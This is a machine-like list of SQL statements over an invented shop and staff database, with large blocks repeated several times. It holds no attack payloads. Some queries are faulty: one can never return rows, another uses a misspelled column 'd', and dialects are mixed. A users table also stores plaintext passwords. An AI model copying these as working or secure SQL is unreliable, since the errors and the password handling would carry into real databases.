SELECT department, AVG(salary) FROM employees GROUP BY department;
SELECT * FROM orders WHERE customer_id = (SELECT id FROM customers WHERE name = 'Bob');
SELECT * FROM products WHERE price <= ALL (SELECT price FROM products WHERE category = 'Toys');
SELECT * FROM employees WHERE name IS NOT NULL;
INSERT INTO customers (name, email, country) VALUES ('Mary Johnson', 'mary@example.com', 'Canada');
UPDATE products SET price = price * 0.9 WHERE category = 'Clothing';
DELETE FROM employees WHERE salary < 30000;
SELECT * FROM orders WHERE status = 'pending' OR status = 'processing';
SELECT name, COUNT(*) AS order_count FROM orders WHERE order_date >= '2023-01-01' GROUP BY name;
SELECT * FROM customers WHERE country NOT IN ('USA', 'Canada');
SELECT * FROM products WHERE created_at >= NOW() - INTERVAL 1 MONTH;
SELECT * FROM orders WHERE customer_id IN (SELECT id FROM customers WHERE country = 'Germany');
SELECT * FROM employees WHERE department = 'Sales' AND hire_date < '2021-01-01';
SELECT name, MAX(salary) FROM employees GROUP BY name;
SELECT * FROM products WHERE category = 'Electronics' AND price < 100;
INSERT INTO orders (customer_id, order_date, total) VALUES (3, '2024-02-01', 150.00);
UPDATE customers SET country = 'USA' WHERE country = 'United States';
DELETE FROM products WHERE name = 'Old Widget';
SELECT * FROM customers WHERE email LIKE '%@gmail.com';
SELECT product_id, COUNT(*) FROM order_items GROUP BY product_id HAVING COUNT(*) > 10;
SELECT * FROM employees WHERE salary BETWEEN 40000 AND 80000;
SELECT * FROM orders WHERE total < (SELECT MIN(total) FROM orders);
SELECT DISTINCT name FROM customers WHERE country = 'France';
SELECT * FROM products WHERE stock > 50 ORDER BY stock ASC;
SELECT * FROM customers WHERE last_login IS NULL;
SELECT name, COUNT(*) FROM orders WHERE order_date >= '2023-01-01' GROUP BY name ORDER BY COUNT(*) DESC;
SELECT * FROM employees WHERE department = 'HR' AND salary > (SELECT AVG(salary) FROM employees WHERE department = 'HR');
SELECT * FROM orders WHERE customer_id = (SELECT id FROM customers WHERE name = 'Charlie');
SELECT * FROM products WHERE price > (SELECT AVG(price) FROM products WHERE category = 'Furniture');
INSERT INTO employees (name, department, salary) VALUES ('Tom Brown', 'IT', 70000);
UPDATE orders SET status = 'completed' WHERE order_id = 456;
DELETE FROM sessions WHERE user_id = 789;
SELECT * FROM customers WHERE country = 'Australia' AND active = 1;
SELECT department, COUNT(*) FROM employees GROUP BY department;
SELECT * FROM orders WHERE order_date BETWEEN '2024-01-01' AND '2024-06-30';
SELECT * FROM products WHERE name LIKE 'A%';
SELECT * FROM employees WHERE hire_date < '2018-01-01' AND salary > 50000;
SELECT * FROM customers WHERE EXISTS (SELECT * FROM orders WHERE customers.id = orders.customer_id AND order_date > '2023-01-01');
SELECT department, SUM(salary) FROM employees GROUP BY department HAVING SUM(salary) > 100000;
SELECT * FROM orders WHERE customer_id IN (SELECT id FROM customers WHERE country = 'Italy');
SELECT * FROM products WHERE price < (SELECT AVG(price) FROM products WHERE category = 'Clothing');
SELECT * FROM employees WHERE name LIKE '%Smith%';
INSERT INTO products (name, price, stock) VALUES ('Gizmo', 49.99, 200);
UPDATE customers SET email = 'updatedemail@example.com' WHERE id = 3;
DELETE FROM orders WHERE order_date < '2023-01-01';
SELECT * FROM customers WHERE phone IS NOT NULL;
SELECT name, COUNT(*) AS order_count FROM orders GROUP BY name ORDER BY order_count DESC;
SELECT * FROM products WHERE category IN ('Toys', 'Games');
SELECT * FROM employees WHERE department = 'Finance' AND salary > 60000;
SELECT * FROM orders WHERE total > (SELECT AVG(total) FROM orders WHERE order_date >= '2023-01-01');
SELECT * FROM customers WHERE name LIKE '%son%';
SELECT * FROM products WHERE stock > 0 ORDER BY price DESC;
SELECT name, email FROM customers WHERE country = 'UK' AND active = 1;
SELECT product_id, SUM(quantity) FROM order_items GROUP BY product_id;
INSERT INTO products (name, price, stock) VALUES ('Gadget', 29.99, 100);
UPDATE customers SET email = 'newemail@example.com' WHERE id = 2;
DELETE FROM orders WHERE order_date < '2023-01-01';
SELECT * FROM employees WHERE hire_date BETWEEN '2019-01-01' AND '2020-12-31';
SELECT * FROM customers WHERE EXISTS (SELECT * FROM orders WHERE customers.id = orders.customer_id AND total > 100);
SELECT department, AVG(salary) FROM employees GROUP BY department;
SELECT * FROM orders WHERE customer_id = (SELECT id FROM customers WHERE name = 'Bob');
SELECT * FROM products WHERE price <= ALL (SELECT price FROM products WHERE category = 'Toys');
SELECT * FROM employees WHERE name IS NOT NULL;
INSERT INTO customers (name, email, country) VALUES ('Mary Johnson', 'mary@example.com', 'Canada');
UPDATE products SET price = price * 0.9 WHERE category = 'Clothing';
DELETE FROM employees WHERE salary < 30000;
SELECT * FROM orders WHERE status = 'pending' OR status = 'processing';
SELECT name, COUNT(*) AS order_count FROM orders WHERE order_date >= '2023-01-01' GROUP BY name;
SELECT * FROM customers WHERE country NOT IN ('USA', 'Canada');
SELECT * FROM products WHERE created_at >= NOW() - INTERVAL 1 MONTH;
SELECT * FROM orders WHERE customer_id IN (SELECT id FROM customers WHERE country = 'Germany');
SELECT * FROM employees WHERE department = 'Sales' AND hire_date < '2021-01-01';
SELECT name, MAX(salary) FROM employees GROUP BY name;
SELECT * FROM products WHERE category = 'Electronics' AND price < 100;
INSERT INTO orders (customer_id, order_date, total) VALUES (3, '2024-02-01', 150.00);
UPDATE customers SET country = 'USA' WHERE country = 'United States';
DELETE FROM products WHERE name = 'Old Widget';
SELECT * FROM customers WHERE email LIKE '%@gmail.com';
SELECT product_id, COUNT(*) FROM order_items GROUP BY product_id HAVING COUNT(*) > 10;
SELECT * FROM employees WHERE salary BETWEEN 40000 AND 80000;
SELECT * FROM orders WHERE total < (SELECT MIN(total) FROM orders);
SELECT DISTINCT name FROM customers WHERE country = 'France';
SELECT * FROM products WHERE stock > 50 ORDER BY stock ASC;
SELECT * FROM customers WHERE last_login IS NULL;
SELECT name, COUNT(*) FROM orders WHERE order_date >= '2023-01-01' GROUP BY name ORDER BY COUNT(*) DESC;
SELECT * FROM employees WHERE department = 'HR' AND salary > (SELECT AVG(salary) FROM employees WHERE department = 'HR');
SELECT * FROM orders WHERE customer_id = (SELECT id FROM customers WHERE name = 'Charlie');
SELECT * FROM products WHERE price > (SELECT AVG(price) FROM products WHERE category = 'Furniture');
INSERT INTO employees (name, department, salary) VALUES ('Tom Brown', 'IT', 70000);
UPDATE orders SET status = 'completed' WHERE order_id = 456;
DELETE FROM sessions WHERE user_id = 789;
SELECT * FROM customers WHERE country = 'Australia' AND active = 1;
SELECT department, COUNT(*) FROM employees GROUP BY department;
SELECT * FROM orders WHERE order_date BETWEEN '2024-01-01' AND '2024-06-30';
SELECT * FROM products WHERE name LIKE 'A%';
SELECT * FROM employees WHERE hire_date < '2018-01-01' AND salary > 50000;
SELECT * FROM customers WHERE EXISTS (SELECT * FROM orders WHERE customers.id = orders.customer_id AND order_date > '2023-01-01');
SELECT department, SUM(salary) FROM employees GROUP BY department HAVING SUM(salary) > 100000;
SELECT * FROM orders WHERE customer_id IN (SELECT id FROM customers WHERE country = 'Italy');
SELECT * FROM products WHERE price < (SELECT AVG(price) FROM products WHERE category = 'Clothing');
SELECT * FROM employees WHERE name LIKE '%Smith%';
INSERT INTO products (name, price, stock) VALUES ('Gizmo', 49.99, 200);
UPDATE customers SET email = 'updatedemail@example.com' WHERE id = 3;
DELETE FROM orders WHERE order_date < '2023-01-01';
SELECT * FROM customers WHERE phone IS NOT NULL;
SELECT name, COUNT(*) AS order_count FROM orders GROUP BY name ORDER BY order_count DESC;
SELECT * FROM products WHERE category IN ('Toys', 'Games');
SELECT * FROM employees WHERE department = 'Finance' AND salary > 60000;
SELECT * FROM orders WHERE total > (SELECT AVG(total) FROM orders WHERE order_date >= '2023-01-01');
SELECT * FROM customers WHERE name LIKE '%son%';
SELECT * FROM products WHERE stock > 0 ORDER BY price DESC;
SELECT name, email FROM customers WHERE country = 'UK' AND active = 1;
SELECT product_id, SUM(quantity) FROM order_items GROUP BY product_id;
INSERT INTO products (name, price, stock) VALUES ('Gadget', 29.99, 100);
UPDATE customers SET email = 'newemail@example.com' WHERE id = 2;
DELETE FROM orders WHERE order_date < '2023-01-01';
SELECT * FROM employees WHERE hire_date BETWEEN '2019-01-01' AND '2020-12-31';
SELECT * FROM customers WHERE EXISTS (SELECT * FROM orders WHERE customers.id = orders.customer_id AND total > 100);
SELECT department, AVG(salary) FROM employees GROUP BY department;
SELECT * FROM orders WHERE customer_id = (SELECT id FROM customers WHERE name = 'Bob');
SELECT * FROM products WHERE price <= ALL (SELECT price FROM products WHERE category = 'Toys');
SELECT * FROM employees WHERE name IS NOT NULL;
INSERT INTO customers (name, email, country) VALUES ('Mary Johnson', 'mary@example.com', 'Canada');
UPDATE products SET price = price * 0.9 WHERE category = 'Clothing';
DELETE FROM employees WHERE salary < 30000;
SELECT * FROM orders WHERE status = 'pending' OR status = 'processing';
SELECT name, COUNT(*) AS order_count FROM orders WHERE order_date >= '2023-01-01' GROUP BY name;
SELECT * FROM customers WHERE country NOT IN ('USA', 'Canada');
SELECT * FROM products WHERE created_at >= NOW() - INTERVAL 1 MONTH;
SELECT * FROM orders WHERE customer_id IN (SELECT id FROM customers WHERE country = 'Germany');
SELECT * FROM employees WHERE department = 'Sales' AND hire_date < '2021-01-01';
SELECT name, MAX(salary) FROM employees GROUP BY name;
SELECT * FROM products WHERE category = 'Electronics' AND price < 100;
INSERT INTO orders (customer_id, order_date, total) VALUES (3, '2024-02-01', 150.00);
UPDATE customers SET country = 'USA' WHERE country = 'United States';
DELETE FROM products WHERE name = 'Old Widget';
SELECT * FROM customers WHERE email LIKE '%@gmail.com';
SELECT product_id, COUNT(*) FROM order_items GROUP BY product_id HAVING COUNT(*) > 10;
SELECT * FROM employees WHERE salary BETWEEN 40000 AND 80000;
SELECT * FROM orders WHERE total < (SELECT MIN(total) FROM orders);
SELECT DISTINCT name FROM customers WHERE country = 'France';
SELECT * FROM products WHERE stock > 50 ORDER BY stock ASC;
SELECT * FROM customers WHERE last_login IS NULL;
SELECT name, COUNT(*) FROM orders WHERE order_date >= '2023-01-01' GROUP BY name ORDER BY COUNT(*) DESC;
SELECT * FROM employees WHERE department = 'HR' AND salary > (SELECT AVG(salary) FROM employees WHERE department = 'HR');
SELECT * FROM orders WHERE customer_id = (SELECT id FROM customers WHERE name = 'Charlie');
SELECT * FROM products WHERE price > (SELECT AVG(price) FROM products WHERE category = 'Furniture');
INSERT INTO employees (name, department, salary) VALUES ('Tom Brown', 'IT', 70000);
UPDATE orders SET status = 'completed' WHERE order_id = 456;
DELETE FROM sessions WHERE user_id = 789;
SELECT * FROM customers WHERE country = 'Australia' AND active = 1;
SELECT department, COUNT(*) FROM employees GROUP BY department;
SELECT * FROM orders WHERE order_date BETWEEN '2024-01-01' AND '2024-06-30';
SELECT * FROM products WHERE name LIKE 'A%';
SELECT * FROM employees WHERE hire_date < '2018-01-01' AND salary > 50000;
SELECT * FROM customers WHERE EXISTS (SELECT * FROM orders WHERE customers.id = orders.customer_id AND order_date > '2023-01-01');
SELECT department, SUM(salary) FROM employees GROUP BY department HAVING SUM(salary) > 100000;
SELECT * FROM orders WHERE customer_id IN (SELECT id FROM customers WHERE country = 'Italy');
SELECT * FROM products WHERE price < (SELECT AVG(price) FROM products WHERE category = 'Clothing');
SELECT * FROM employees WHERE name LIKE '%Smith%';
INSERT INTO products (name, price, stock) VALUES ('Gizmo', 49.99, 200);
UPDATE customers SET email = 'updatedemail@example.com' WHERE id = 3;
DELETE FROM orders WHERE order_date < '2023-01-01';
SELECT * FROM customers WHERE phone IS NOT NULL;
SELECT name, COUNT(*) AS order_count FROM orders GROUP BY name ORDER BY order_count DESC;
SELECT * FROM products WHERE category IN ('Toys', 'Games');
SELECT * FROM employees WHERE department = 'Finance' AND salary > 60000;
SELECT * FROM orders WHERE total > (SELECT AVG(total) FROM orders WHERE order_date >= '2023-01-01');
SELECT * FROM customers WHERE name LIKE '%son%';
SELECT * FROM products WHERE stock > 0 ORDER BY price DESC;
SELECT name, email FROM customers WHERE country = 'UK' AND active = 1;
SELECT product_id, SUM(quantity) FROM order_items GROUP BY product_id;
INSERT INTO products (name, price, stock) VALUES ('Gadget', 29.99, 100);
UPDATE customers SET email = 'newemail@example.com' WHERE id = 2;
DELETE FROM orders WHERE order_date < '2023-01-01';
SELECT * FROM employees WHERE hire_date BETWEEN '2019-01-01' AND '2020-12-31';
SELECT * FROM customers WHERE EXISTS (SELECT * FROM orders WHERE customers.id = orders.customer_id AND total > 100);
CREATE TABLE customers (id INT PRIMARY KEY, name VARCHAR(100), email VARCHAR(100));
DROP TABLE IF EXISTS temporary_table;
ALTER TABLE employees ADD COLUMN birthdate DATE;
CREATE INDEX idx_customer_name ON customers (name);
DELETE FROM sessions WHERE created_at < NOW() - INTERVAL 1 DAY;
GRANT SELECT ON orders TO user1;
REVOKE INSERT ON orders FROM user2;
INSERT INTO logs (action, created_at) VALUES ('INSERT', NOW());
UPDATE settings SET value = 'new_value' WHERE key = 'setting_key';
BEGIN TRANSACTION;
COMMIT;
ROLLBACK;
CREATE VIEW active_customers AS SELECT * FROM customers WHERE active = 1;
SELECT * FROM active_customers;
CREATE OR REPLACE FUNCTION calculate_tax(amount DECIMAL) RETURNS DECIMAL AS 'SELECT amount * 0.1;' LANGUAGE SQL;
CALL calculate_tax(1000);
SET FOREIGN_KEY_CHECKS = 0;
SET FOREIGN_KEY_CHECKS = 1;
CREATE TEMPORARY TABLE tmp_orders AS SELECT * FROM orders WHERE total > 100;
SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME = 'customers';
TRUNCATE TABLE logs;
EXEC sp_help 'customers';
UPDATE products SET stock = stock - sold WHERE product_id = 10;
INSERT INTO purchase_history (product_id, quantity) VALUES (1, 3);
ALTER TABLE orders MODIFY COLUMN total DECIMAL(10, 2);
SELECT AVG(total) FROM orders WHERE order_date > CURRENT_DATE - INTERVAL '30 days';
INSERT INTO employees (name, department) SELECT name, department FROM new_employees;
CREATE TRIGGER update_inventory AFTER INSERT ON purchase_history FOR EACH ROW BEGIN UPDATE products SET stock = stock - NEW.quantity WHERE product_id = NEW.product_id; END;
DROP TRIGGER IF EXISTS update_inventory;
CREATE TABLE orders (id INT PRIMARY KEY, customer_id INT, order_date DATE, total DECIMAL(10, 2));
ALTER TABLE orders ADD CONSTRAINT fk_customer FOREIGN KEY (customer_id) REFERENCES customers(id);
DROP INDEX idx_customer_name ON customers;
CREATE UNIQUE INDEX idx_email ON customers (email);
ALTER TABLE employees DROP COLUMN birthdate;
CREATE TABLE logs (id INT PRIMARY KEY, action VARCHAR(100), created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP);
INSERT INTO logs (action) VALUES ('User login');
SELECT * FROM logs WHERE created_at >= NOW() - INTERVAL 1 DAY;
CREATE VIEW recent_logs AS SELECT * FROM logs WHERE created_at >= NOW() - INTERVAL 1 WEEK;
SELECT * FROM recent_logs;
UPDATE logs SET action = 'User logout' WHERE id = 1;
DELETE FROM logs WHERE created_at < NOW() - INTERVAL 1 MONTH;
SELECT COUNT(*) FROM customers;
CREATE TABLE products (id INT PRIMARY KEY, name VARCHAR(100), price DECIMAL(10, 2));
INSERT INTO products (name, price) VALUES ('Product A', 25.00);
UPDATE products SET price = price * 1.1 WHERE id = 1;
DELETE FROM products WHERE price < 10;
CREATE TABLE categories (id INT PRIMARY KEY, name VARCHAR(100));
INSERT INTO categories (name) VALUES ('Electronics');
ALTER TABLE products ADD COLUMN category_id INT;
UPDATE products SET category_id = 1 WHERE id = 1;
CREATE INDEX idx_category ON products (category_id);
SELECT p.name, c.name FROM products p JOIN categories c ON p.category_id = c.id;
CREATE TABLE purchase_history (id INT PRIMARY KEY, product_id INT, quantity INT, purchase_date DATE);
INSERT INTO purchase_history (product_id, quantity, purchase_date) VALUES (1, 2, NOW());
SELECT * FROM purchase_history WHERE purchase_date = CURRENT_DATE;
CREATE TRIGGER log_purchase AFTER INSERT ON purchase_history FOR EACH ROW BEGIN INSERT INTO logs (action) VALUES (CONCAT('Purchased ', NEW.quantity, ' of product ID ', NEW.product_id)); END;
DROP TRIGGER IF EXISTS log_purchase;
CREATE TABLE settings (key VARCHAR(100) PRIMARY KEY, value VARCHAR(100));
INSERT INTO settings (key, value) VALUES ('site_name', 'My Website');
SELECT * FROM settings;
UPDATE settings SET value = 'New Website' WHERE key = 'site_name';
DELETE FROM settings WHERE key = 'site_name';
CREATE TABLE sessions (id INT PRIMARY KEY, user_id INT, created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP);
INSERT INTO sessions (user_id) VALUES (1);
SELECT * FROM sessions WHERE created_at >= NOW() - INTERVAL 1 HOUR;
CREATE TRIGGER expire_sessions BEFORE DELETE ON sessions FOR EACH ROW BEGIN DELETE FROM logs WHERE created_at < OLD.created_at - INTERVAL 1 DAY; END;
DROP TRIGGER IF EXISTS expire_sessions;
CREATE TABLE users (id INT PRIMARY KEY, username VARCHAR(100), password VARCHAR(100));
INSERT INTO users (username, password) VALUES ('admin', 'password');
SELECT * FROM users WHERE username = 'admin';
UPDATE users SET password = 'newpassword' WHERE username = 'admin';
DELETE FROM users WHERE username = 'admin';
CREATE TABLE feedback (id INT PRIMARY KEY, user_id INT, comment TEXT);
INSERT INTO feedback (user_id, comment) VALUES (1, 'Great service!');
SELECT * FROM feedback WHERE user_id = 1;
UPDATE feedback SET comment = 'Excellent service!' WHERE id = 1;
DELETE FROM feedback WHERE id = 1;
CREATE TABLE discounts (id INT PRIMARY KEY, product_id INT, discount_rate DECIMAL(5, 2));
INSERT INTO discounts (product_id, discount_rate) VALUES (1, 10.00);
SELECT * FROM discounts WHERE product_id = 1;
UPDATE discounts SET discount_rate = 15.00 WHERE id = 1;
DELETE FROM discounts WHERE id = 1;
CREATE TABLE inventory (id INT PRIMARY KEY, product_id INT, quantity INT);
INSERT INTO inventory (product_id, quantity) VALUES (1, 100);
SELECT * FROM inventory WHERE product_id = 1;
UPDATE inventory SET quantity = quantity - 1 WHERE product_id = 1;
DELETE FROM inventory WHERE quantity = 0;
CREATE TABLE orders_history (id INT PRIMARY KEY, order_id INT, status VARCHAR(100), updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP);
INSERT INTO orders_history (order_id, status) VALUES (1, 'Shipped');
SELECT * FROM orders_history WHERE order_id = 1;
UPDATE orders_history SET status = 'Delivered' WHERE id = 1;
DELETE FROM orders_history WHERE id = 1;
CREATE TABLE wishlists (id INT PRIMARY KEY, user_id INT, product_id INT);
INSERT INTO wishlists (user_id, product_id) VALUES (1, 1);
SELECT * FROM wishlists WHERE user_id = 1;
DELETE FROM wishlists WHERE id = 1;
CREATE TABLE addresses (id INT PRIMARY KEY, user_id INT, address TEXT);
INSERT INTO addresses (user_id, address) VALUES (1, '123 Main St');
SELECT * FROM addresses WHERE user_id = 1;
UPDATE addresses SET address = '456 Elm St' WHERE id = 1;
DELETE FROM addresses WHERE id = 1;
CREATE TABLE transactions (id INT PRIMARY KEY, user_id INT, amount DECIMAL(10, 2), transaction_date DATE);
INSERT INTO transactions (user_id, amount, transaction_date) VALUES (1, 100.00, NOW());
SELECT * FROM transactions WHERE user_id = 1;
UPDATE transactions SET amount = 150.00 WHERE id = 1;
DELETE FROM transactions WHERE id = 1;
CREATE TABLE notifications (id INT PRIMARY KEY, user_id INT, message TEXT, created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP);
INSERT INTO notifications (user_id, message) VALUES (1, 'Welcome to our service!');
SELECT * FROM notifications WHERE user_id = 1;
UPDATE notifications SET message = 'New message!' WHERE id = 1;
DELETE FROM notifications WHERE id = 1;
CREATE TABLE roles (id INT PRIMARY KEY, name VARCHAR(100));
INSERT INTO roles (name) VALUES ('Admin');
SELECT * FROM roles;
UPDATE roles SET name = 'User' WHERE id = 1;
DELETE FROM roles WHERE id = 1;
CREATE TABLE user_roles (user_id INT, role_id INT, PRIMARY KEY (user_id, role_id));
INSERT INTO user_roles (user_id, role_id) VALUES (1, 1);
SELECT * FROM user_roles WHERE user_id = 1;
DELETE FROM user_roles WHERE user_id = 1 AND role_id = 1;
CREATE TABLE transactions_history (id INT PRIMARY KEY, transaction_id INT, status VARCHAR(100), updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP);
INSERT INTO transactions_history (transaction_id, status) VALUES (1, 'Completed');
SELECT * FROM transactions_history WHERE transaction_id = 1;
UPDATE transactions_history SET status = 'Failed' WHERE id = 1;
DELETE FROM transactions_history WHERE id = 1;
CREATE TABLE product_reviews (id INT PRIMARY KEY, product_id INT, user_id INT, rating INT, comment TEXT);
INSERT INTO product_reviews (product_id, user_id, rating, comment) VALUES (1, 1, 5, 'Excellent product!');
SELECT * FROM product_reviews WHERE product_id = 1;
UPDATE product_reviews SET rating = 4 WHERE id = 1;
DELETE FROM product_reviews WHERE id = 1;
CREATE TABLE user_sessions (id INT PRIMARY KEY, user_id INT, session_token VARCHAR(255), created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP);
INSERT INTO user_sessions (user_id, session_token) VALUES (1, 'token123');
SELECT * FROM user_sessions WHERE user_id = 1;
UPDATE user_sessions SET session_token = 'token456' WHERE id = 1;
DELETE FROM user_sessions WHERE id = 1;
CREATE TABLE payment_methods (id INT PRIMARY KEY, user_id INT, method VARCHAR(100));
INSERT INTO payment_methods (user_id, method) VALUES (1, 'Credit Card');
SELECT * FROM payment_methods WHERE user_id = 1;
UPDATE payment_methods SET method = 'PayPal' WHERE id = 1;
DELETE FROM payment_methods WHERE id = 1;
CREATE TABLE shipping_addresses (id INT PRIMARY KEY, user_id INT, address TEXT);
INSERT INTO shipping_addresses (user_id, address) VALUES (1, '789 Oak St');
SELECT * FROM shipping_addresses WHERE user_id = 1;
UPDATE shipping_addresses SET address = '101 Pine St' WHERE id = 1;
DELETE FROM shipping_addresses WHERE id = 1;
CREATE TABLE product_categories (id INT PRIMARY KEY, product_id INT, category_id INT);
INSERT INTO product_categories (product_id, category_id) VALUES (1, 1);
SELECT * FROM product_categories WHERE product_id = 1;
DELETE FROM product_categories WHERE product_id = 1 AND category_id = 1;
CREATE TABLE user_feedback (id INT PRIMARY KEY, user_id INT, feedback TEXT);
INSERT INTO user_feedback (user_id, feedback) VALUES (1, 'Great experience!');
SELECT * FROM user_feedback WHERE user_id = 1;
UPDATE user_feedback SET feedback = 'Amazing service!' WHERE id = 1;
DELETE FROM user_feedback WHERE id = 1;
CREATE TABLE order_items (id INT PRIMARY KEY, order_id INT, product_id INT, quantity INT);
INSERT INTO order_items (order_id, product_id, quantity) VALUES (1, 1, 2);
SELECT * FROM order_items WHERE order_id = 1;
UPDATE order_items SET quantity = 3 WHERE id = 1;
DELETE FROM order_items WHERE id = 1;
CREATE TABLE user_activity (id INT PRIMARY KEY, user_id INT, activity TEXT, created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP);
INSERT INTO user_activity (user_id, activity) VALUES (1, 'Logged in');
SELECT * FROM user_activity WHERE user_id = 1;
UPDATE user_activity SET activity = 'Logged out' WHERE id = 1;
DELETE FROM user_activity WHERE id = 1;
CREATE TABLE user_preferences (id INT PRIMARY KEY, user_id INT, preference TEXT);
INSERT INTO user_preferences (user_id, preference) VALUES (1, 'Dark mode');
SELECT * FROM user_preferences WHERE user_id = 1;
UPDATE user_preferences SET preference = 'Light mode' WHERE id = 1;
DELETE FROM user_preferences WHERE id = 1;
CREATE TABLE session_tokens (id INT PRIMARY KEY, user_id INT, token VARCHAR(255), created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP);
INSERT INTO session_tokens (user_id, token) VALUES (1, 'token789');
SELECT * FROM session_tokens WHERE user_id = 1;
UPDATE session_tokens SET token = 'token101' WHERE id = 1;
DELETE FROM session_tokens WHERE id = 1;
CREATE TABLE notifications_settings (id INT PRIMARY KEY, user_id INT, setting VARCHAR(100));
INSERT INTO notifications_settings (user_id, setting) VALUES (1, 'Email notifications');
SELECT * FROM notifications_settings WHERE user_id = 1;
UPDATE notifications_settings SET setting = 'SMS notifications' WHERE id = 1;
DELETE FROM notifications_settings WHERE id = 1;
CREATE TABLE user_roles (user_id INT, role_id INT, PRIMARY KEY (user_id, role_id));
INSERT INTO user_roles (user_id, role_id) VALUES (1, 1);
SELECT * FROM user_roles WHERE user_id = 1;
DELETE FROM user_roles WHERE user_id = 1 AND role_id = 1;
CREATE TABLE user_sessions (id INT PRIMARY KEY, user_id INT, session_token VARCHAR(255), created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP);
INSERT INTO user_sessions (user_id, session_token) VALUES (1, 'session_token_1');
SELECT * FROM user_sessions WHERE user_id = 1;
UPDATE user_sessions SET session_token = 'session_token_2' WHERE id = 1;
DELETE FROM user_sessions WHERE id = 1;
CREATE TABLE user_notifications (id INT PRIMARY KEY, user_id INT, message TEXT, created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP);
INSERT INTO user_notifications (user_id, message) VALUES (1, 'You have a new message.');
SELECT * FROM user_notifications WHERE user_id = 1;
UPDATE user_notifications SET message = 'Your profile has been updated.' WHERE id = 1;
DELETE FROM user_notifications WHERE id = 1;
CREATE TABLE user_settings (id INT PRIMARY KEY, user_id INT, setting_name VARCHAR(100), setting_value VARCHAR(100));
INSERT INTO user_settings (user_id, setting_name, setting_value) VALUES (1, 'theme', 'dark');
SELECT * FROM user_settings WHERE user_id = 1;
UPDATE user_settings SET setting_value = 'light' WHERE id = 1;
DELETE FROM user_settings WHERE id = 1;
CREATE TABLE product_tags (id INT PRIMARY KEY, product_id INT, tag VARCHAR(100));
INSERT INTO product_tags (product_id, tag) VALUES (1, 'new');
SELECT * FROM product_tags WHERE product_id = 1;
DELETE FROM product_tags WHERE product_id = 1 AND tag = 'new';
CREATE TABLE user_subscriptions (id INT PRIMARY KEY, user_id INT, subscription_type VARCHAR(100));
INSERT INTO user_subscriptions (user_id, subscription_type) VALUES (1, 'premium');
SELECT * FROM user_subscriptions WHERE user_id = 1;
UPDATE user_subscriptions SET subscription_type = 'basic' WHERE id = 1;
DELETE FROM user_subscriptions WHERE id = 1;
CREATE TABLE user_activity_log (id INT PRIMARY KEY, user_id INT, activity TEXT, created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP);
INSERT INTO user_activity_log (user_id, activity) VALUES (1, 'Logged in.');
SELECT * FROM user_activity_log WHERE user_id = 1;
UPDATE user_activity_log SET activity = 'Logged out.' WHERE id = 1;
DELETE FROM user_activity_log WHERE id = 1;
CREATE TABLE user_feedback (id INT PRIMARY KEY, user_id INT, feedback TEXT);
INSERT INTO user_feedback (user_id, feedback) VALUES (1, 'Great service!');
SELECT * FROM user_feedback WHERE user_id = 1;
UPDATE user_feedback SET feedback = 'Excellent service!' WHERE id = 1;
DELETE FROM user_feedback WHERE id = 1;
CREATE TABLE user_preferences (id INT PRIMARY KEY, user_id INT, preference TEXT);
INSERT INTO user_preferences (user_id, preference) VALUES (1, 'Dark mode');
SELECT * FROM user_preferences WHERE user_id = 1;
UPDATE user_preferences SET preference = 'Light mode' WHERE id = 1;
DELETE FROM user_preferences WHERE id = 1;
CREATE TABLE user_roles (user_id INT, role_id INT, PRIMARY KEY (user_id, role_id));
INSERT INTO user_roles (user_id, role_id) VALUES (1, 1);
SELECT * FROM user_roles WHERE user_id = 1;
DELETE FROM user_roles WHERE user_id = 1 AND role_id = 1;
CREATE TABLE user_sessions (id INT PRIMARY KEY, user_id INT, session_token VARCHAR(255), created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP);
INSERT INTO user_sessions (user_id, session_token) VALUES (1, 'session_token_1');
SELECT * FROM user_sessions WHERE user_id = 1;
UPDATE user_sessions SET session_token = 'session_token_2' WHERE id = 1;
DELETE FROM user_sessions WHERE id = 1;
CREATE TABLE user_notifications (id INT PRIMARY KEY, user_id INT, message TEXT, created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP);
INSERT INTO user_notifications (user_id, message) VALUES (1, 'You have a new message.');
SELECT * FROM user_notifications WHERE user_id = 1;
UPDATE user_notifications SET message = 'Your profile has been updated.' WHERE id = 1;
DELETE FROM user_notifications WHERE id = 1;
CREATE TABLE user_settings (id INT PRIMARY KEY, user_id INT, setting_name VARCHAR(100), setting_value VARCHAR(100));
INSERT INTO user_settings (user_id, setting_name, setting_value) VALUES (1, 'theme', 'dark');
SELECT * FROM user_settings WHERE user_id = 1;
UPDATE user_settings SET setting_value = 'light' WHERE id = 1;
DELETE FROM user_settings WHERE id = 1;
CREATE TABLE product_tags (id INT PRIMARY KEY, product_id INT, tag VARCHAR(100));
INSERT INTO product_tags (product_id, tag) VALUES (1, 'new');
SELECT * FROM product_tags WHERE product_id = 1;
DELETE FROM product_tags WHERE product_id = 1 AND tag = 'new';
CREATE TABLE user_subscriptions (id INT PRIMARY KEY, user_id INT, subscription_type VARCHAR(100));
INSERT INTO user_subscriptions (user_id, subscription_type) VALUES (1, 'premium');
SELECT * FROM user_subscriptions WHERE user_id = 1;
UPDATE user_subscriptions SET subscription_type = 'basic' WHERE id = 1;
DELETE FROM user_subscriptions WHERE id = 1;
CREATE TABLE user_activity_log (id INT PRIMARY KEY, user_id INT, activity TEXT, created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP);
INSERT INTO user_activity_log (user_id, activity) VALUES (1, 'Logged in.');
SELECT * FROM user_activity_log WHERE user_id = 1;
UPDATE user_activity_log SET activity = 'Logged out.' WHERE id = 1;
DELETE FROM user_activity_log WHERE d = 1;
WITH recent_orders AS (SELECT customer_id, order_date FROM orders WHERE order_date >= DATE_SUB(NOW(), INTERVAL 1 MONTH)) SELECT customer_id, COUNT(*) AS order_count FROM recent_orders GROUP BY customer_id;
